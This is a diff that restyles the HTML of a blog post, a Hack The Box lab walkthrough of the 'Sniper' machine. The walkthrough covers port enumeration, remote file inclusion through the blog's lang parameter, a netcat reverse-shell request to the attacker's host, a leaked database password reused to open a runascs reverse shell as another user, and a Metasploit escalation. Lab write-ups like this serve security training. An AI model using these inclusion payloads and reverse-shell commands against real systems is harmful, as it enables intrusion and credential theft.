@@ -1,1 +1,135 @@
-<html><head><meta charset="utf-8"></head><body><figure class="image"><img style="aspect-ratio:1331/162;" src="../img/posts/2024-10-05-Sniper(HTB)/01-8289f2547a.png" width="1331" height="162"></figure><p>&nbsp;</p><p>&nbsp;</p><p>Open ports</p><p>80/tcp &nbsp; &nbsp;open &nbsp;http &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Microsoft IIS httpd 10.0<br>135/tcp &nbsp; open &nbsp;msrpc &nbsp; &nbsp; &nbsp; &nbsp; Microsoft Windows RPC<br>139/tcp &nbsp; open &nbsp;netbios-ssn &nbsp; Microsoft Windows netbios-ssn<br>445/tcp &nbsp; open &nbsp;microsoft-ds?<br>49667/tcp open &nbsp;msrpc &nbsp; &nbsp; &nbsp; &nbsp; Microsoft Windows RPC</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong><u>Shell as iusr</u></strong></span></p><p>&nbsp;</p><p>&nbsp;</p><p>This URL looks like it could have lfi</p><p>&nbsp;</p><p><a href="http://10.10.10.151/blog/?lang=blog-en.php">http://10.10.10.151/blog/?lang=blog-en.php</a></p><p>&nbsp;</p><p>and it does</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:2135/814;" src="../img/posts/2024-10-05-Sniper(HTB)/02-0ca2d989d5.png" width="2135" height="814"></figure><p>&nbsp;</p><p>&nbsp;</p><p>dirbuster finds a db.php file located in the user directory. We can confirm it exists with lfi but we cannot see the file.</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1846/482;" src="../img/posts/2024-10-05-Sniper(HTB)/03-41184792bc.png" width="1846" height="482"></figure><p><br><br>&nbsp;Putting our own smb share in we can see the machine authenticates to us but we dont get a hash</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:921/257;" src="../img/posts/2024-10-05-Sniper(HTB)/04-87777aa438.png" width="921" height="257"></figure><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:685/272;" src="../img/posts/2024-10-05-Sniper(HTB)/05-4410d55770.png" width="685" height="272"></figure><p>&nbsp;</p><p>&nbsp;</p><p>With RFI we can include a shell and have RCE</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1972/1120;" src="../img/posts/2024-10-05-Sniper(HTB)/06-7cd4e9190b.png" width="1972" height="1120"></figure><p>&nbsp;</p><p>&nbsp;</p><p>We can get a reverse shell using netcat</p><p><code><strong>GET /blog/?lang=\\10.10.14.8\share\cmd.php&amp;cmd=\\10.10.14.8\share\nc.exe+-e+cmd+10.10.14.8+443 HTTP/1.1</strong></code><br><code><strong>Host: 10.10.10.151</strong></code><br><code><strong>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</strong></code><br><code><strong>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</strong></code><br><code><strong>Accept-Language: en-US,en;q=0.5</strong></code><br><code><strong>Accept-Encoding: gzip, deflate, br</strong></code><br><code><strong>Connection: keep-alive</strong></code><br><code><strong>Upgrade-Insecure-Requests: 1</strong></code></p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:490/190;" src="../img/posts/2024-10-05-Sniper(HTB)/07-75ff571c3a.png" width="490" height="190"></figure><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong><u>Shell as Chris</u></strong></span></p><p>&nbsp;</p><p>We can get credentials from the db.php file now</p><p><code><strong>C:\inetpub\wwwroot\user&gt;type db.php</strong></code><br><code><strong>type db.php</strong></code><br><code><strong>&lt;?php</strong></code><br><code><strong>// Enter your Host, username, password, database below.</strong></code><br><code><strong>// I left password empty because i do not set password on localhost.</strong></code><br><code><strong>$con = mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");</strong></code><br><code><strong>// Check connection</strong></code><br><code><strong>if (mysqli_connect_errno())</strong></code><br><code><strong>&nbsp;{</strong></code><br><code><strong>&nbsp;echo "Failed to connect to MySQL: " . mysqli_connect_error();</strong></code><br><code><strong>&nbsp;}</strong></code><br><code><strong>?&gt;</strong></code><br>&nbsp;</p><p>&nbsp;</p><p><code><strong>36mEAhz/B8xQ~2VM</strong></code></p><p>&nbsp;</p><p>&nbsp;</p><p>There is another user named chris on the machine and the password above is correct for his user but we cannot use it with evil-winrm</p><figure class="image"><img style="aspect-ratio:1262/88;" src="../img/posts/2024-10-05-Sniper(HTB)/08-e675b8a46d.png" width="1262" height="88"></figure><p>&nbsp;</p><p>&nbsp;</p><p>I transferred runascs.exe to the machine so I can get a shell as chris</p><p><code>.\runascs.exe chris 36mEAhz/B8xQ~2VM cmd -r 10.10.14.8:9999</code></p><figure class="image image-style-block-align-left"><img style="aspect-ratio:496/226;" src="../img/posts/2024-10-05-Sniper(HTB)/09-721b0344aa.png" width="496" height="226"></figure><p>&nbsp;</p><p>&nbsp;</p><p>Got the admin hash and it cracks to $uperpassw0rd but its only valid for the website and not the actual admin password</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:758/119;" src="../img/posts/2024-10-05-Sniper(HTB)/10-8b67aafaff.png" width="758" height="119"></figure><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong><u>Shell as administrator</u></strong></span></p><p>&nbsp;</p><p>The machine was very unstable and both my shells would die every 5 minutes and it was making enumerating extremely painful. I tried multiple shells and had no luck. Decided to use metasploit and I used an exploit that came out of the machine did so I didnt do the intended path.</p><p>&nbsp;</p><p>Notice the shell died right after getting the flag. I had to rush through a meterpreter session to even try to get the flag.</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:954/542;" src="../img/posts/2024-10-05-Sniper(HTB)/11-382871b292.png" width="954" height="542"></figure><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:698/641;" src="../img/posts/2024-10-05-Sniper(HTB)/12-fa1b4f96d8.png" width="698" height="641"></figure></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>HTB: Sniper | HackWithJordan</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="../assets/css/syntax.css">
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            box-sizing: border-box;
+        }
+
+        .post {
+            width: 100%;
+            max-width: 900px;
+        }
+
+        .terminal {
+            background: #98AFC7;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            max-width: 100%;
+            white-space: pre-wrap;
+            word-break: break-word;
+            font-family: monospace;
+            margin: 15px 0;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            margin: 15px 0;
+            display: block;
+        }
+
+        p {
+            margin: 15px 0;
+            line-height: 1.5;
+            overflow-wrap: anywhere;
+        }
+
+        code {
+            overflow-wrap: anywhere;
+        }
+    </style>
+</head>
+<body>
+
+    <article class="post">
+        <header style="display: flex; align-items: center; gap: 20px;">
+            <img src="../img/posts/2024-10-05-Sniper(HTB)/01-8289f2547a.png" alt="HTB: Sniper cover" style="height: 80px; border-radius: 4px;">
+            <div>
+                <h1 style="margin: 0;">HTB: Sniper</h1>
+                <div class="post-meta">October 5, 2024 &bull; HTB</div>
+            </div>
+        </header>
+
+        <img alt="Screenshot 1" height="162" src="../img/posts/2024-10-05-Sniper(HTB)/01-8289f2547a.png" style="aspect-ratio:1331/162;" width="1331"/>
+
+        <p>Open ports</p>
+
+        <p>80/tcp    open  http          Microsoft IIS httpd 10.0<br/>135/tcp   open  msrpc         Microsoft Windows RPC<br/>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br/>445/tcp   open  microsoft-ds?<br/>49667/tcp open  msrpc         Microsoft Windows RPC</p>
+
+        <h1 style="color:red;">Shell as iusr</h1>
+
+        <p>This URL looks like it could have lfi</p>
+
+        <p><a href="http://10.10.10.151/blog/?lang=blog-en.php">http://10.10.10.151/blog/?lang=blog-en.php</a></p>
+
+        <p>and it does</p>
+
+        <img alt="Screenshot 2" height="814" src="../img/posts/2024-10-05-Sniper(HTB)/02-0ca2d989d5.png" style="aspect-ratio:2135/814;" width="2135"/>
+
+        <p>dirbuster finds a db.php file located in the user directory. We can confirm it exists with lfi but we cannot see the file.</p>
+
+        <img alt="Screenshot 3" height="482" src="../img/posts/2024-10-05-Sniper(HTB)/03-41184792bc.png" style="aspect-ratio:1846/482;" width="1846"/>
+
+        <p><br/><br/> Putting our own smb share in we can see the machine authenticates to us but we dont get a hash</p>
+
+        <img alt="Screenshot 4" height="257" src="../img/posts/2024-10-05-Sniper(HTB)/04-87777aa438.png" style="aspect-ratio:921/257;" width="921"/>
+
+        <img alt="Screenshot 5" height="272" src="../img/posts/2024-10-05-Sniper(HTB)/05-4410d55770.png" style="aspect-ratio:685/272;" width="685"/>
+
+        <p>With RFI we can include a shell and have RCE</p>
+
+        <img alt="Screenshot 6" height="1120" src="../img/posts/2024-10-05-Sniper(HTB)/06-7cd4e9190b.png" style="aspect-ratio:1972/1120;" width="1972"/>
+
+        <p>We can get a reverse shell using netcat</p>
+
+        <p><code><strong>GET /blog/?lang=\\10.10.14.8\share\cmd.php&amp;cmd=\\10.10.14.8\share\nc.exe+-e+cmd+10.10.14.8+443 HTTP/1.1</strong></code><br/><code><strong>Host: 10.10.10.151</strong></code><br/><code><strong>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</strong></code><br/><code><strong>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</strong></code><br/><code><strong>Accept-Language: en-US,en;q=0.5</strong></code><br/><code><strong>Accept-Encoding: gzip, deflate, br</strong></code><br/><code><strong>Connection: keep-alive</strong></code><br/><code><strong>Upgrade-Insecure-Requests: 1</strong></code></p>
+
+        <img alt="Screenshot 7" height="190" src="../img/posts/2024-10-05-Sniper(HTB)/07-75ff571c3a.png" style="aspect-ratio:490/190;" width="490"/>
+
+        <h1 style="color:red;">Shell as Chris</h1>
+
+        <p>We can get credentials from the db.php file now</p>
+
+        <p><code><strong>C:\inetpub\wwwroot\user&gt;type db.php</strong></code><br/><code><strong>type db.php</strong></code><br/><code><strong>&lt;?php</strong></code><br/><code><strong>// Enter your Host, username, password, database below.</strong></code><br/><code><strong>// I left password empty because i do not set password on localhost.</strong></code><br/><code><strong>$con = mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");</strong></code><br/><code><strong>// Check connection</strong></code><br/><code><strong>if (mysqli_connect_errno())</strong></code><br/><code><strong> {</strong></code><br/><code><strong> echo "Failed to connect to MySQL: " . mysqli_connect_error();</strong></code><br/><code><strong> }</strong></code><br/><code><strong>?&gt;</strong></code><br/> </p>
+
+        <pre class="terminal"><code><strong>36mEAhz/B8xQ~2VM</strong></code></pre>
+
+        <p>There is another user named chris on the machine and the password above is correct for his user but we cannot use it with evil-winrm</p>
+
+        <img alt="Screenshot 8" height="88" src="../img/posts/2024-10-05-Sniper(HTB)/08-e675b8a46d.png" style="aspect-ratio:1262/88;" width="1262"/>
+
+        <p>I transferred runascs.exe to the machine so I can get a shell as chris</p>
+
+        <pre class="terminal"><code>.\runascs.exe chris 36mEAhz/B8xQ~2VM cmd -r 10.10.14.8:9999</code></pre>
+
+        <img alt="Screenshot 9" height="226" src="../img/posts/2024-10-05-Sniper(HTB)/09-721b0344aa.png" style="aspect-ratio:496/226;" width="496"/>
+
+        <p>Got the admin hash and it cracks to $uperpassw0rd but its only valid for the website and not the actual admin password</p>
+
+        <img alt="Screenshot 10" height="119" src="../img/posts/2024-10-05-Sniper(HTB)/10-8b67aafaff.png" style="aspect-ratio:758/119;" width="758"/>
+
+        <h1 style="color:red;">Shell as administrator</h1>
+
+        <p>The machine was very unstable and both my shells would die every 5 minutes and it was making enumerating extremely painful. I tried multiple shells and had no luck. Decided to use metasploit and I used an exploit that came out of the machine did so I didnt do the intended path.</p>
+
+        <p>Notice the shell died right after getting the flag. I had to rush through a meterpreter session to even try to get the flag.</p>
+
+        <img alt="Screenshot 11" height="542" src="../img/posts/2024-10-05-Sniper(HTB)/11-382871b292.png" style="aspect-ratio:954/542;" width="954"/>
+
+        <img alt="Screenshot 12" height="641" src="../img/posts/2024-10-05-Sniper(HTB)/12-fa1b4f96d8.png" style="aspect-ratio:698/641;" width="698"/>
+    </article>
+
+</body>
+</html>
